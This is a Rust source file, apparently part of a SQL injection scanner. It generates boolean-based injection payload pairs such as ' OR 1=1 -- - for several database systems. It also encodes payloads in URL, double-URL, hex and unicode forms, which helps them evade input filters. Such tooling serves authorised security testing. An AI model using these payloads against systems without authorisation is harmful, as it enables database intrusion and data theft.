#![deny(unsafe_code)]

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct BooleanPayload {
    pub true_payload: String,
    pub false_payload: String,
    pub comment: String,
}

impl BooleanPayload {
    #[must_use]
    pub fn new(
        true_payload: impl Into<String>,
        false_payload: impl Into<String>,
        comment: impl Into<String>,
    ) -> Self {
        Self {
            true_payload: true_payload.into(),
            false_payload: false_payload.into(),
            comment: comment.into(),
        }
    }
}

/// Generate boolean payloads adapted per DBMS.
#[must_use]
pub fn boolean_payloads_for(dbms: Option<&str>) -> Vec<BooleanPayload> {
    let comment = match dbms {
        Some("mysql") => " -- -",
        Some("postgres") => " --",
        Some("mssql") => " --",
        Some("oracle") => " --",
        _ => " -- -",
    };
    vec![
        BooleanPayload::new(
            format!("' OR 1=1{comment}"),
            format!("' OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' AND 1=1{comment}"),
            format!("' AND 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("\" OR 1=1{comment}"),
            format!("\" OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!(") OR 1=1{comment}"),
            format!(") OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR 'a'='a{comment}"),
            format!("' OR 'a'='b{comment}"),
            comment,
        ),
    ]
}

/// Encodings: URL, double-URL, hex, unicode, whitespace variants, case mixing.
#[must_use]
pub fn encode_payload(payload: &str, encoding: &str) -> String {
    match encoding {
        "url" => url::form_urlencoded::byte_serialize(payload.as_bytes()).collect(),
        "double_url" => {
            let once: String = url::form_urlencoded::byte_serialize(payload.as_bytes()).collect();
            url::form_urlencoded::byte_serialize(once.as_bytes()).collect()
        }
        "hex" => payload.bytes().map(|b| format!("%{b:02x}")).collect(),
        "unicode" => payload
            .chars()
            .map(|c| format!("%u{:04x}", c as u32))
            .collect(),
        _ => payload.to_owned(),
    }
}
